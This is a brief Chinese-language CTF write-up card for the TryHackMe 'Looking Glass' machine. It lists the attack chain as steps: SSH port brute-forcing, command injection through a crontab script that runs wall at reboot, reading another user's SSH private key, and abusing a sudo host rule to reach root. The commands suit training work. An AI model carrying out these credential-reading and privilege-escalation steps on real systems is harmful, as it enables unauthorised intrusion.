---
title: "TryHackMe Looking Glass writeup"
category: misc
tags: ["TryHackMe", "misc", "tryhackme", "ssh-port-brute", "binary-search-jabberwock", "sudo-reboot-privesc"]
signals: ["TryHackMe 2020", "tryhackme", "ssh-port-brute", "binary-search-jabberwock", "sudo-reboot-privesc", "alice-sudo-other-host", "alice-ssh-id-rsa", "misc_unknown", "TryHackMe", "Looking", "Glass", "SSH", "Jabberwocky", "sudo"]
difficulty: medium
source: "https://www.ctfiot.com/27362.html"
tools: ["nmap"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# TryHackMe Looking Glass writeup

> 赛事：TryHackMe 2020 | 方向：misc | 难度：medium | 工具：nmap

## 一句话总结

TryHackMe Looking Glass：5000 SSH 端口二分爆破 + Jabberwocky 诗 + sudo reboot 提权到 humptydumpty + alice SSH 私钥 + host sudo 越权。

## 攻击链

1. nmap -A -p- 5000 端口 SSH 服务 (9000-13999)
2. 二分 ssh 爆破 13547 端口
3. Jabberwocky 诗: ''PatientlyCountTumblingHowever
4. ssh jabberwock@13547 登录
5. sudo -l 看到 /sbin/reboot 无密码
6. cat /etc/crontab 看到 @reboot tweedledum bash /home/jabberwock/twasBrillig.sh
7. twasBrillig.sh 内容：wall $(cat /home/tweedledum/poem.txt)
8. sudo reboot → reboot 后 wall 触发
9. 注入 wall $(cat /home/tweedledum/humptydumpty.txt > /home/jabberwock/humptydumpty.txt)
10. 获得 humptydumpty 密码 (the password is ***************)
11. su humptydumpty 切换
12. ls -l /home/alice → drwx--x--x 6 alice alice
13. cat /home/alice/.ssh/id_rsa 读 SSH 私钥
14. ssh -i id_rsa alice@10.10.225.183
15. /etc/sudoers.d/alice: alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
16. sudo -h ssalg-gnikool /bin/bash (host 部分)
17. 获取 root

## 关键 payload

```
wall $(cat /home/tweedledum/poem.txt)  # 注入点
```

## 经验教训

真实 Linux box 中 wall 命令注入是经典 sudo reboot 提权路径；sudo -h host NOPASSWD 越权也常被忽视。

## 标签

tryhackme、ssh-port-brute、binary-search-jabberwock、sudo-reboot-privesc、alice-sudo-other-host、alice-ssh-id-rsa

## 参考来源

- https://www.ctfiot.com/27362.html
- 原文件：TryHackMe_Looking_Glass_writeup.full.md
